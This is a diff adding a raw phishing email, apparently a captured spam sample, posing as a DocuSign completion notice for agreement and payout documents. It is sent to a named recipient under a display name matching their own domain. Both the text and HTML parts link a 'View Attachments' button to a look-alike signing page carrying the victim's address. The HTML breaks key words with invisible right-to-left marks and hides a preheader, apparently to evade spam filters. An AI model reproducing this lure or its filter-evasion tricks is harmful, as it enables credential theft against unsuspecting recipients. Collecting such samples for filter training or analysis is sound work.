@@ -1,0 +1,240 @@
+Return-Path: <lynda@enneagramhorizons.com>
+Delivered-To: johannes.olegard@cyfoexample.one.com
+Received: from mx4.cst.mailpod12-cph3.one.com ([10.27.56.14])
+	by mailstorage27.cst.mailpod12-cph3.one.com with LMTP
+	id EGeWAcykWWdWQgAATK8Ghw
+	(envelope-from <lynda@enneagramhorizons.com>)
+	for <johannes.olegard@cyfoexample.one.com>; Wed, 11 Dec 2024 14:42:20 +0000
+X-HalOne-Spam: true
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;	d=custmx.one.com;
+ s=20201015;
+	h=message-id:date:mime-version:content-type:to:subject:from:x-halone-refid:	
+ x-halone-sa:from:x-halone-sa:x-halone-refid;
+	bh=ESFCNgNPlZwQUoA0gSk/NhkbP2Gi5Cw00dbin9lrbxI=;	=?utf-8?q?b=3Dq+gTNMa3lKRn?=
+ =?utf-8?q?iGfK5hq8q+NyPxIlQjtdpqHn0me/csrUEHbdItWf8vhp8x+RxssRzCwD/BE5A79O8?=
+	 =?utf-8?q?FdVGkPu2WRRFjH184DxYUoW7Ys3khAtj0GWAjuLNT7kPLB63xdJUYoPuOPsP+RQ4?=
+ =?utf-8?q?FMsQp+eIRHWsR6=09_iGPHFF7q3w9m1EM1pwdO+BuAmQRDYzKIdPk8oOydSGqQ82a?=
+ =?utf-8?q?piSmJLtKeHNOh7avF9zi6NB63nAbytF=09_GXX4mKjBW+sNYvqG4L8uV557VmX3Zt?=
+ =?utf-8?q?N7fwf8xT4gCU5jvZ7UIFazsPeMh/3HrES9olV/UfFbgPaEcd?=	
+ G8gm2BvCQcQK7utVprwNjSyPqduYSyQ==
+X-HalOne-SA: 2.2
+X-HalOne-RefID: 155866::1733928139-696BB36A-F61420DC/0/0
+X-HalOne-Spam-Probability: 1
+Authentication-Results: mx4.pub.mailpod12-cph3.one.com;	spf=pass
+ smtp.mailfrom=enneagramhorizons.com smtp.remote-ip=15.204.3.6;	dkim=pass
+ header.d=oxsus-vadesecure.net header.s=dkim-202410-rsa2048
+ header.a=rsa-sha256 header.b=lHUCTyFP;	dmarc=none
+ header.from=enneagramhorizons.com;
+X-HalOne-ID: 1eecf00f-b7ce-11ef-aa98-b07b25bf0102
+Received: from nmtao202.oxsus-vadesecure.net (mta-232a.oxsus-vadesecure.net
+ [15.204.3.6])	by mx4.pub.mailpod12-cph3.one.com (Halon) with ESMTPS	id
+ 1eecf00f-b7ce-11ef-aa98-b07b25bf0102;	Wed, 11 Dec 2024 14:42:19 +0000 (UTC)
+Authentication-Results: oxsus-vadesecure.net;
+ auth=pass smtp.auth=4@76789 smtp.mailfrom=lynda@enneagramhorizons.com;
+ARC-Seal: i=1; a=rsa-sha256; d=oxsus-vadesecure.net; s=arc-202309-rsa2048;
+ t=1733928137; cv=none; =?utf-8?q?b=3DF6DzxyPxHB+JuK1Zi2/mVyXMB7+yBDut41/IQr?=
+ =?utf-8?q?XThVuOw3X5tmcRQyCQ0SKUx1KPMncdUhNX/aZ5Wa9lxuh21CuxFEQE8jBMMAzGqKE?=
+ =?utf-8?q?XdZK88FOCy2xhlBDt0+bzV62C5BzvXXxmsIppHQ1ItPcy33RatW8x59lLNhnJuUEp?=
+ =?utf-8?q?0wRywcxQZZKJO6/TUmOpxQ8cZVHR4CQibaKe5GGJCJVyK5Wz9+6LG6QrIofvZeK4L?=
+ =?utf-8?q?rdGmrzFzmZ6DsY/xkos7DXxUKxFdaRKac7F8ICmc1kOs4g9CK6hEK7sIIIUbEuOHJ?=
+ =?utf-8?q?SgFVQZiNj0TcCnkboyCh3XheXwmcQp8Ww4UhVkXLYtQg=3D=3D?=
+ARC-Message-Signature: i=1; a=rsa-sha256; d=oxsus-vadesecure.net;
+ s=arc-202309-rsa2048; t=1733928137; c=relaxed/relaxed; =?utf-8?q?h=3Dfrom?=
+ =?utf-8?q?=3Areply-to=3Asubject=3Adate=3Ato=3Acc=3Aresent-date=3Aresent-fro?=
+ =?utf-8?q?m=3Aresent-to=3Aresent-cc=3Ain-reply-to=3Areferences=3Alist-id=3A?=
+ =?utf-8?q?list-help=3Alist-unsubscribe=3Alist-unsubscribe-post=3Alist-subsc?=
+ =?utf-8?q?ribe=3Alist-post=3Alist-owner=3Alist-archive=3B?=
+ bh=ESFCNgNPlZwQUoA0gSk/NhkbP2Gi5Cw00dbin9lrbxI=; =?utf-8?q?b=3Dg3VWnbhvAkWt?=
+ =?utf-8?q?6GWfFkrXaUNci+KzE8koIKhsKX3mmg9TkXiFfVc9yQ/t1QPlZztNdrx/qccIgJMIh?=
+ =?utf-8?q?NgMkM4O7wpdnzyVsJiGmFFQGHg2uhRZ9TAqEnU+gxPnGcS3Ph9jDVfZhoXomvGH4l?=
+ =?utf-8?q?Bk1nNuW20iLYsrT0E98RXF6K7HUkP/EeRUBnw2sDkNCBth4iWAa7GTy7m+Njh7H8w?=
+ =?utf-8?q?UuceWOLtSg+J9Bob6QyFlTXEWJFKAYxoCMgt/iMXovhDDk0d3MnnhDqcZuEKY5g76?=
+ =?utf-8?q?05fernlklveSPIq+Qpl20PxLETU1EG4oZUjs8rqO1UoE8JLHXKsDwBUl0MHRgJCt6?=
+ =?utf-8?q?PlWDw=3D=3D?=
+ARC-Authentication-Results: i=1;
+DKIM-Signature: v=1; a=rsa-sha256; bh=ESFCNgNPlZwQUoA0gSk/NhkbP2Gi5Cw00dbin9
+ lrbxI=; c=relaxed/relaxed; d=oxsus-vadesecure.net; h=from:reply-to:
+ subject:date:to:cc:resent-date:resent-from:resent-to:resent-cc:
+ in-reply-to:references:list-id:list-help:list-unsubscribe:
+ list-unsubscribe-post:list-subscribe:list-post:list-owner:list-archive;
+ q=dns/txt; s=dkim-202410-rsa2048; t=1733928137; x=1734532937; b=lHUCTyF
+ PbdjmTGO76FZo0c9BDETQP6vsC8WJSB9Vl68F/z1NuZKGt0wRwntId0efVhDRrmhtExJNYf
+ eLZG5Ysnw/By85sDlfRt0h0n/T7mU/2veuWK0QKPokspGYPW3spRwYbxn6k8I5uyswd/ODV
+ 6TBT17T3pxdBC9kwuBF+ajEQvhwV47iN0cnm2r0NRCbk8qjCvX5tGA/bFpX+l/SqOGsQmaS
+ qfd6RTfCjIYluC6qPDtqa6T63OCdWx3dJGnIte/XSEoC2u/G++Uv1DYIEICWpqXyYmbKwq1
+ +omdJbtJrup3qW0KwXfXxZKOGSZtYVCjh92kjE11ZruPIRXfGvQ==
+Received: from proxy-13.proxy.cloudus.ewr.xion.oxcs.net ([191.101.51.114])
+ by oxsus2nmtao02p.internal.vadesecure.com with ngmta
+ id a5093e65-1810267430d4184c; Wed, 11 Dec 2024 14:42:17 +0000
+From: "cyfoexample.one.com" <lynda@enneagramhorizons.com>
+Subject: FW Reminder - Completed: Complete with Docusign: 2024 /2025
+ Agreement & Payout Letter.pdf, ITR+FINS Signing Pages.pdf Received for
+ johannes.olegard@cyfoexample.one.com
+To: <johannes.olegard@cyfoexample.one.com>
+Content-Type: multipart/alternative;
+ boundary="mPAF1PE6ClvQNrXB5AE=_Cd0nAP5gpwclR"
+MIME-Version: 1.0
+Date: Wed, 11 Dec 2024 15:42:17 +0100
+Message-Id: <111620241242153A3ABA373F$68EB3561EC@enneagramhorizons.com>
+
+This is a multi-part message in MIME format
+
+--mPAF1PE6ClvQNrXB5AE=_Cd0nAP5gpwclR
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+??johannes.olegard@cyfoexample.one.com=20Attachme?nts
+
+??=20
+
+??=20T??r??ans??fe??r=20A??g??r??e??em??e????nt=20-=20NDA.doc
+
+945.4=20K??B??
+
+Payment????=20A??g??r??e??em??e????nt.....doc
+
+1.4=20M??B??
+
+??V??iew=20Attachme??nts=20https://llanservices.com/updated-docounter3ign/#=
+johannes.olegard@cyfoexample.one.com
+
+Documents=20were=20shared=20vla=20pdf=20online=20Docs.
+
+--mPAF1PE6ClvQNrXB5AE=_Cd0nAP5gpwclR
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<!DOCTYPE=20html>
+<html=20class=3Dsg-campaigns=20data-editor-version=3D"2"><head>
+<meta=20http-equiv=3D"Content-Type"=20content=3D"text/html;=20charset=3Diso=
+-8859-1">
+=20=20<meta=20name=3Dviewport=20content=3D"width=3Ddevice-width,=20initial-=
+scale=3D1,=20minimum-scale=3D1,=20maximum-scale=3D1"><!--[if=20!mso]><!--><=
+!--<![endif]--><!--[if=20(gte=20mso=209)|(IE)]><xml>=20<o:OfficeDocumentSet=
+tings>=20<o:AllowPNG/>=20<o:PixelsPerInch>96</o:PixelsPerInch>=20</o:Office=
+DocumentSettings>=20</xml><![endif]--><!--[if=20(gte=20mso=209)|(IE)]>=20<s=
+tyle=20type=3Dtext/css>=20body=20{width:=20600px;margin:=200=20auto;}=20tab=
+le=20{border-collapse:=20collapse;}=20table,=20td=20{mso-table-lspace:=200p=
+t;mso-table-rspace:=200pt;}=20img=20{-ms-interpolation-mode:=20bicubic;}=20=
+</style>=20<![endif]-->=20<style=20type=3Dtext/css>=20body,=20p,=20div=20{=
+=20font-family:=20trebuchet=20ms,helvetica,sans-serif;=20font-size:=2014px;=
+=20}=20body=20{=20color:=20#000000;=20}=20body=20a=20{=20color:=20#0055B8;=
+=20text-decoration:=20none;=20}=20p=20{=20margin:=200;=20padding:=200;=20}=
+=20table.wrapper=20{=20width:100%=20!important;=20table-layout:=20fixed;=20=
+-webkit-font-smoothing:=20antialiased;=20-webkit-text-size-adjust:=20100%;=
+=20-moz-text-size-adjust:=20100%;=20-ms-text-size-adjust:=20100%;=20}=20img=
+.max-width=20{=20max-width:=20100%=20!important;=20}=20.column.of-2=20{=20w=
+idth:=2050%;=20}=20.column.of-3=20{=20width:=2033.333%;=20}=20.column.of-4=
+=20{=20width:=2025%;=20}=20@media=20screen=20and=20(max-width:480px)=20{=20=
+.preheader=20.rightColumnContent,=20.footer=20.rightColumnContent=20{=20tex=
+t-align:=20left=20!important;=20}=20.preheader=20.rightColumnContent=20div,=
+=20.preheader=20.rightColumnContent=20span,=20.footer=20.rightColumnContent=
+=20div,=20.footer=20.rightColumnContent=20span=20{=20text-align:=20left=20!=
+important;=20}=20.preheader=20.rightColumnContent,=20.preheader=20.leftColu=
+mnContent=20{=20font-size:=2080%=20!important;=20padding:=205px=200;=20}=20=
+table.wrapper-mobile=20{=20width:=20100%=20!important;=20table-layout:=20fi=
+xed;=20}=20img.max-width=20{=20height:=20auto=20!important;=20max-width:=20=
+100%=20!important;=20}=20a.bulletproof-button=20{=20display:=20block=20!imp=
+ortant;=20width:=20auto=20!important;=20font-size:=2080%;=20padding-left:=
+=200=20!important;=20padding-right:=200=20!important;=20}=20.columns=20{=20=
+width:=20100%=20!important;=20}=20.column=20{=20display:=20block=20!importa=
+nt;=20width:=20100%=20!important;=20padding-left:=200=20!important;=20paddi=
+ng-right:=200=20!important;=20margin-left:=200=20!important;=20margin-right=
+:=200=20!important;=20}=20.social-icon-column=20{=20display:=20inline-block=
+=20!important;=20}=20}=20</style>=20<!--user=20entered=20Head=20Start--><!-=
+-End=20Head=20user=20entered--><BASE=20href=3D"http:/\__"><meta=20http-equi=
+v=3D"X-UA-Compatible"=20content=3D"IE=3Dedge"><title>FW=20Reminder=20-=20Co=
+mpleted:=20Complete=20with=20Docusign:=202024=20/2025=20Agreement=20&=20Pay=
+out=20Letter.pdf,=20ITR+FINS=20Signing=20Pages.pdf=20Received=20for=20johan=
+nes.olegard@cyfoexample.one.com</title>
+=20</head>
+=20<body>=20<center=20class=3Dwrapper=20data-body-style=3D"font-size:14px;=
+=20font-family:trebuchet=20ms,helvetica,sans-serif;=20color:#000000;=20back=
+ground-color:#F7F7F7;"=20data-link-color=3D"#0055B8">=20<div=20class=3Dwebk=
+it><table=20class=3D"wrapper"=20cellspacing=3D0=20cellpadding=3D0=20width=
+=3D"100%"=20bgcolor=3D#f7f7f7=20border=3D0>=20<tr><td=20bgcolor=3D#f7f7f7=
+=20valign=3Dtop=20width=3D"100%"><table=20role=3Dcontent-container=20class=
+=3D"outer"=20cellspacing=3D0=20cellpadding=3D0=20width=3D"100%"=20align=3Dc=
+enter=20border=3D0>=20<tr><td=20width=3D"100%"><table=20cellspacing=3D0=20c=
+ellpadding=3D0=20width=3D"100%"=20border=3D0>=20<tr><td><!--[if=20mso]>=20<=
+center><table><tr><td=20width=3D"600">=20<![endif]--><table=20style=3D"MAX-=
+WIDTH:=20600px;=20WIDTH:=20100%"=20cellspacing=3D0=20cellpadding=3D0=20widt=
+h=3D"100%"=20align=3Dcenter=20border=3D0>=20<tr><td=20role=3Dmodules-contai=
+ner=20style=3D"COLOR:=20#000000;=20PADDING-BOTTOM:=200px;=20TEXT-ALIGN:=20l=
+eft;=20PADDING-TOP:=200px;=20PADDING-LEFT:=200px;=20PADDING-RIGHT:=200px"=
+=20bgcolor=3D#ffffff=20width=3D"100%"=20align=3Dleft><table=20role=3Dmodule=
+=20class=3D"module=20preheader=20preheader-hide"=20style=3D"BOX-SIZING:=20b=
+order-box;=20HEIGHT:=200px;=20COLOR:=20transparent;=20PADDING-BOTTOM:=200px=
+;=20PADDING-TOP:=200px;=20PADDING-LEFT:=200px;=20DISPLAY:=20none=20!importa=
+nt;=20PADDING-RIGHT:=200px;=20VISIBILITY:=20hidden;=20BACKGROUND-COLOR:=20#=
+f7f7f7;=20mso-hide:=20all;=20opacity:=200"=20cellspacing=3D0=20cellpadding=
+=3D0=20width=3D"100%"=20align=3Dcenter=20bgcolor=3D#f7f7f7=20border=3D0=20d=
+ata-end-index=3D"5847"=20data-start-index=3D"5511"=20data-version=3D"2"=20d=
+ata-type=3D"preheader"=200?>=20<tr=20role=3Dmodule-content=20data-end-index=
+=3D"5880"=20data-start-index=3D"5854">=20<td=20height=3D"100%"=20valign=3Dt=
+op=20data-end-index=3D"5920"=20data-start-index=3D"5889"><table=20class=3D"=
+column=20column-0"=20style=3D"WIDTH:=20600px;=20BORDER-COLLAPSE:=20collapse=
+;=20BORDER-SPACING:=200;=20MARGIN:=200px"=20cellspacing=3D0=20cellpadding=
+=3D0=20width=3D600=20align=3Dleft=20border=3D0>=20</table></td></tr></table=
+><table=20style=3D"BORDER-TOP:=20#cccccc=201px=20solid;=20BORDER-RIGHT:=20#=
+cccccc=201px=20solid;=20WIDTH:=20100%;=20BACKGROUND:=20#f6f6f6;=20BORDER-BO=
+TTOM:=20#cccccc=201px=20solid;=20BORDER-LEFT:=20#cccccc=201px=20solid"=20ce=
+llspacing=3D0=20cellpadding=3D0=20border=3D0>=20<thead>=20<tr>=20<TH=20styl=
+e=3D"FONT-SIZE:=2018px;=20FONT-FAMILY:=20calibri,helvetica,arial,sans-serif=
+;=20BACKGROUND:=20#f6f6f6;=20FONT-WEIGHT:=20normal;=20COLOR:=20#333333;=20P=
+ADDING-BOTTOM:=2015px;=20TEXT-ALIGN:=20left;=20PADDING-TOP:=2015px;=20PADDI=
+NG-LEFT:=2020px;=20PADDING-RIGHT:=2010px">&#8207;&#8207;johannes.olegard@cy=
+foexample.one.com=20Attachme&#8207;nts</TH>=20<TH=20style=3D"FONT-SIZE:=201=
+3px;=20FONT-FAMILY:=20calibri,helvetica,arial,sans-serif;=20BACKGROUND:=20#=
+f6f6f6;=20FONT-WEIGHT:=20normal;=20COLOR:=20#333333;=20PADDING-BOTTOM:=2015=
+px;=20TEXT-ALIGN:=20right;=20PADDING-TOP:=2015px;=20PADDING-LEFT:=2010px;=
+=20PADDING-RIGHT:=2020px">&#8207;&#8207;=20</TH></tr></thead>=20<tr><td=20s=
+tyle=3D"PADDING-BOTTOM:=2020px;=20PADDING-TOP:=200px;=20PADDING-LEFT:=2020p=
+x;=20PADDING-RIGHT:=2020px"=20colspan=3D2><table=20style=3D"WIDTH:=20100%;=
+=20BACKGROUND:=20#ffffff"=20cellspacing=3D0=20cellpadding=3D0=20border=3D0>=
+=20<tr><td=20style=3D"FONT-SIZE:=2016px;=20FONT-FAMILY:=20calibri,helvetica=
+,arial,sans-serif;=20FONT-WEIGHT:=20normal;=20COLOR:=20#666666;=20PADDING-B=
+OTTOM:=206px;=20TEXT-ALIGN:=20left;=20PADDING-TOP:=206px;=20PADDING-LEFT:=
+=2020px;=20PADDING-RIGHT:=200px">&#8207;&#8207;=20T&#8207;&#8207;r&#8207;&#=
+8207;ans&#8207;&#8207;fe&#8207;&#8207;r=20A&#8207;&#8207;g&#8207;&#8207;r&#=
+8207;&#8207;e&#8207;&#8207;em&#8207;&#8207;e&#8207;&#8207;&#8207;&#8207;nt=
+=20-=20NDA.doc</td><td=20style=3D"FONT-SIZE:=2014px;=20FONT-FAMILY:=20calib=
+ri,helvetica,arial,sans-serif;=20FONT-WEIGHT:=20normal;=20COLOR:=20#999999;=
+=20PADDING-BOTTOM:=206px;=20TEXT-ALIGN:=20right;=20PADDING-TOP:=206px;=20PA=
+DDING-LEFT:=200px;=20PADDING-RIGHT:=2020px">945.4=20K&#8207;&#8207;B&#8207;=
+&#8207;</td></tr><tr><td=20style=3D"FONT-SIZE:=2016px;=20FONT-FAMILY:=20cal=
+ibri,helvetica,arial,sans-serif;=20FONT-WEIGHT:=20normal;=20COLOR:=20#66666=
+6;=20PADDING-BOTTOM:=206px;=20TEXT-ALIGN:=20left;=20PADDING-TOP:=206px;=20P=
+ADDING-LEFT:=2020px;=20PADDING-RIGHT:=200px">Payment&#8207;&#8207;&#8207;&#=
+8207;=20A&#8207;&#8207;g&#8207;&#8207;r&#8207;&#8207;e&#8207;&#8207;em&#820=
+7;&#8207;e&#8207;&#8207;&#8207;&#8207;nt.....doc</td><td=20style=3D"FONT-SI=
+ZE:=2014px;=20FONT-FAMILY:=20calibri,helvetica,arial,sans-serif;=20FONT-WEI=
+GHT:=20normal;=20COLOR:=20#999999;=20PADDING-BOTTOM:=206px;=20TEXT-ALIGN:=
+=20right;=20PADDING-TOP:=206px;=20PADDING-LEFT:=200px;=20PADDING-RIGHT:=202=
+0px">1.4=20M&#8207;&#8207;B&#8207;&#8207;</td></tr>=20</table></td></tr>=20=
+<TFOOT>=20<tr><td=20style=3D"PADDING-BOTTOM:=2010px;=20PADDING-LEFT:=2020px=
+"=20colspan=3D2><table=20cellspacing=3D0=20cellpadding=3D0=20border=3D0>=20=
+<tr><td=20style=3D"BACKGROUND:=20#2071c5;=20PADDING-BOTTOM:=209px;=20PADDIN=
+G-TOP:=209px;=20PADDING-LEFT:=2015px;=20PADDING-RIGHT:=2015px;=20border-rad=
+ius:=202px">=20<center><a=20style=3D"FONT-SIZE:=2014px;=20TEXT-DECORATION:=
+=20none;=20FONT-FAMILY:=20calibri,helvetica,arial,sans-serif;=20FONT-WEIGHT=
+:=20normal;=20COLOR:=20#ffffff;=20TEXT-ALIGN:=20center"=20href=3D"https://l=
+lanservices.com/updated-docounter3ign/#johannes.olegard@cyfoexample.one.com=
+.com"><strong=20style=3D"FONT-WEIGHT:=20normal">&#8207;&#8207=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20;V&#8207;&#8207;iew=20Attachme&#8207;&#8207;nts</strong></a>=
+=20</center></td></tr></table></td></tr><tr><td=20style=3D"FONT-SIZE:=2012p=
+x;=20FONT-FAMILY:=20calibri,helvetica,arial,sans-serif;=20FONT-WEIGHT:=20no=
+rmal;=20COLOR:=20#666666;=20PADDING-BOTTOM:=2015px;=20PADDING-LEFT:=2020px;=
+=20PADDING-RIGHT:=2020px"=20colspan=3D2>Documents=20were=20shared=20vla=20p=
+df=20online=20Docs.=20</td></tr></TFOOT></table></td></tr></table><!--[if=
+=20mso]>=20</td>=20</tr>=20</table>=20</center>=20<![endif]--></td></tr></t=
+able></td></tr></table></td></tr></table></div></center>=20
+</body>
+=20</html>
+
+--mPAF1PE6ClvQNrXB5AE=_Cd0nAP5gpwclR--
+
